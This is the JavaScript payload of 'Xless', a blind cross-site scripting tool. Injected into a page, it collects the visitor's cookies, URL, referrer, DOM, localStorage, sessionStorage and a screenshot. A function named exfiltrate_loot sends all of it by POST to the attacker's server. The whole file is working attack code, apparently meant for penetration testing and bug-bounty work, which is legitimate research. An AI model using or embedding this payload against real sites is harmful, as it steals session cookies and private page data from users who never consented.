// Xless: The serverlesss Blind XSS app.
// Author: Mazin Ahmed <mazin@mazinahmed.net>

console.log("Loaded xless.");
var collected_data = {};

var curScript = document.currentScript;

function return_value(value) {
  return (value !== undefined) ? value : ""
}

function screenshot() {
  return new Promise(function (resolve, reject) {
    html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true}).then(function (canvas) {
        resolve(return_value(canvas.toDataURL())) // png in dataURL format
    });
  });
}


function collect_data() {
  return new Promise(function (resolve, reject) {
    collected_data["Cookies"] = collected_data["Location"] = collected_data["Referrer"] = collected_data["User-Agent"] = collected_data["Browser Time"] = collected_data["Origin"] = collected_data["DOM"] = collected_data["localStorage"] = collected_data["sessionStorage"] = collected_data["Screenshot"] = "";

    try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}
    try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}
    try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}
    try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
    try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
    try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
    try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
    collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
    try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
    try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
    try { 
      screenshot().then(function(img) {
        collected_data["Screenshot"] = img
        resolve(collected_data)
      });
    } catch(e) {
      resolve(collected_data)
    }
  });
}


function exfiltrate_loot() {
  // Get the URI of our BXSS server
  var uri = new URL(curScript.src);
  var exf_url = uri.origin + "/c"
  
  var xhr = new XMLHttpRequest()
  xhr.open("POST", exf_url, true)
  xhr.setRequestHeader("Content-Type", "application/json")
  xhr.send(JSON.stringify(collected_data))
}

// Load the html2canvas dependency
(function(d, script) {
    script = d.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.onload = function(){
        // remote script has loaded
        collect_data().then(function() {
          exfiltrate_loot();
        });
    };
    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
    d.getElementsByTagName('head')[0].appendChild(script);
}(document));
